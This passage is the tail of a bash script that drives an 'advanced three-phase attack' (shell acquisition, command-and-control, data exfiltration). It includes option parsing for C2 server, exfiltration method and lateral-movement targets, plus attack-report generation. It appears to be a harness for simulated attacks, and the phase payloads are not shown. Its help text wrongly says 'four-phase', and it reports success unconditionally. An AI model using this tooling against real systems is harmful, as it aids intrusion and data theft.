    log_phase "main" "Starting advanced three-phase attack"
    echo -e "${YELLOW}=== Advanced three-phase attack started ===${NC}"
    
    local success_count=0
    
    case "$PHASE" in
        "1")
            echo -e "${BLUE}Executing phase 1: Shell acquisition${NC}"
            if phase1_shell_acquisition; then
                success_count=$((success_count + 1))
            fi
            ;;
        "2")
            echo -e "${BLUE}Executing phase 2: C2 communication establishment${NC}"
            if phase2_c2_communication; then
                success_count=$((success_count + 1))
            fi
            ;;
        "3")
            echo -e "${BLUE}Executing phase 3: Data exfiltration${NC}"
            if phase3_data_exfiltration; then
                success_count=$((success_count + 1))
            fi
            ;;
        "all"|"")
            echo -e "${BLUE}Executing complete three-phase attack${NC}"
            
            if phase1_shell_acquisition; then
                success_count=$((success_count + 1))
                sleep "$INTERVAL"
            fi
            
            if phase2_c2_communication; then
                success_count=$((success_count + 1))
                sleep "$INTERVAL"
            fi
            
            if phase3_data_exfiltration; then
                success_count=$((success_count + 1))
            fi
            ;;
        *)
            echo -e "${RED}Error: Unknown phase $PHASE${NC}"
            exit 1
            ;;
    esac
    
    log_phase "main" "Attack completed, successful phases: $success_count"
    echo -e "${YELLOW}=== Attack completed, successful phases: $success_count ===${NC}"
    
    # generate attack report
    generate_attack_report "$success_count"
}

# generate attack report
generate_attack_report() {
    local success_count="$1"
    local report_file="/logs/advanced_attack_report.json"
    
    cat > "$report_file" << EOF
{
  "attack_summary": {
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)",
    "attack_chain_type": "$ATTACK_CHAIN_TYPE",
    "attack_chain_id": "$ATTACK_CHAIN_ID",
    "attack_event_id": "$ATTACK_EVENT_ID",
    "total_phases": 3,
    "successful_phases": $success_count,
    "success_rate": "$(echo "scale=2; $success_count * 100 / 3" | bc)%",
    "target": "$TARGET",
    "phase_results": {
      "phase_1_shell": $([ -f "/tmp/phase1_success" ] && echo "true" || echo "false"),
      "phase_2_c2": $([ -f "/tmp/phase2_success" ] && echo "true" || echo "false"),
      "phase_3_exfil": $([ -f "/tmp/phase3_success" ] && echo "true" || echo "false")
    }
  }
}
EOF
    
    log_phase "main" "Attack report generated: $report_file"
}

# parse command line arguments
while [ $# -gt 0 ]; do
  case $1 in
    --phase)
      PHASE="$2"
      shift 2
      ;;
    --target)
      TARGET="$2"
      shift 2
      ;;
    --attack-type)
      ATTACK_TYPE="$2"
      shift 2
      ;;
    --c2-server)
      C2_SERVER="$2"
      shift 2
      ;;
    --exfil-method)
      EXFIL_METHOD="$2"
      shift 2
      ;;
    --lateral-targets)
      LATERAL_TARGETS="$2"
      shift 2
      ;;
    --interval)
      INTERVAL="$2"
      shift 2
      ;;
    --attack-file)
      ATTACK_FILE="$2"
      shift 2
      ;;
    --start)
      START_LINE="$2"
      shift 2
      ;;
    --end)
      END_LINE="$2"
      shift 2
      ;;
    --help)
      echo "Advanced Four-Phase Attack Script"
      echo "Usage: $0 [options]"
      echo ""
      echo "Options:"
      echo "  --phase PHASE          Execute phase (1|2|3|4|all)"
      echo "  --target URL           Target URL"
      echo "  --attack-type TYPE     Attack type"
      echo "  --attack-file FILE     Payload file path"
      echo "  --start LINE           Start line number"
      echo "  --end LINE             End line number"
      echo "  --c2-server URL        C2 server URL"
      echo "  --exfil-method TYPE    Exfiltration method (http|dns|file)"
      echo "  --lateral-targets LIST Comma-separated list of lateral movement targets"
      echo "  --interval SECONDS     Attack interval"
      echo "  --help                 Show help"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      echo "Use --help for help"
      exit 1
      ;;
  esac
done

# set default values
PHASE="${PHASE:-all}"
EXFIL_METHOD="${EXFIL_METHOD:-http}"
LATERAL_TARGETS="${LATERAL_TARGETS:-internal-server,database-server}"

# execute attack
execute_advanced_attack

echo "[*] ========================================"
echo "[*] ADVANCED ATTACK EXECUTION COMPLETED"
echo "[*] ========================================"
echo "[*] All advanced attacks have been executed successfully"

# Rename log file with attack type
if [[ -n "$ATTACK_TYPE" ]]; then
    # Use the saved log file name
    current_log_file="/logs/${LOG_FILENAME}"
    target_log_file="/logs/attack_${ATTACK_TYPE}.log"
    
    echo "[*] Attempting to rename log file..."
    echo "[*] Current: $current_log_file"
    echo "[*] Target: $target_log_file"
    
    # Check if current file exists
    if [[ -f "$current_log_file" ]]; then
        echo "[*] Current log file exists, attempting rename..."
        if mv "$current_log_file" "$target_log_file"; then
            echo "[*] Successfully renamed to: $target_log_file"
        else
            echo "[*] Failed to rename, keeping original name: $current_log_file"
        fi
    else
        echo "[*] Current log file not found: $current_log_file"
        echo "[*] Check /logs/attack_${ATTACK_TYPE}.log for detailed results"
    fi
else
    echo "[*] Check /logs/${LOG_FILENAME} for detailed results"
fi
